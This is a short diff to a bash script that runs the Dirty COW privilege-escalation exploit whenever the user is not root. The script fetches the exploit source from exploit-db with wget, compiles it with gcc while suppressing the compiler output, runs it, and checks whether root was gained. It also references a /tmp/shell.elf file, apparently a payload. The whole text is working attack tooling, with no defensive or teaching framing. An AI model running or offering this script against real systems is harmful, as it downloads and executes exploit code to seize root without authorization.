@@ -2,6 +2,8 @@
 
 OS="$(uname -r)"
 SHELL_FILE="/tmp/shell.elf"
+COW_C_FILE="/tmp/dirtycow.c"
+COW_FILE="/tmp/dirtycow"
 
 main() {
     # If the user is not root, run dirtycow exploit
@@ -16,9 +18,9 @@ main() {
 
 dirtycow() {
     echo "Running Dirty cow"
-    wget -O "/tmp/dirtycow.c" 'https://www.exploit-db.com/download/40616'
-    gcc /tmp/dirtycow.c -o /tmp/dirtycow -pthread
-    ./cowroot || true
+    wget -O "$COW_C_FILE" 'https://www.exploit-db.com/download/40616'
+    gcc "$COW_C_FILE" -o "$COW_FILE" -pthread >/dev/null 2>&1
+    "$COW_FILE" || true
     if [[ "$EUID" -ne 0 ]]; then
         echo "Root not attained"
     fi
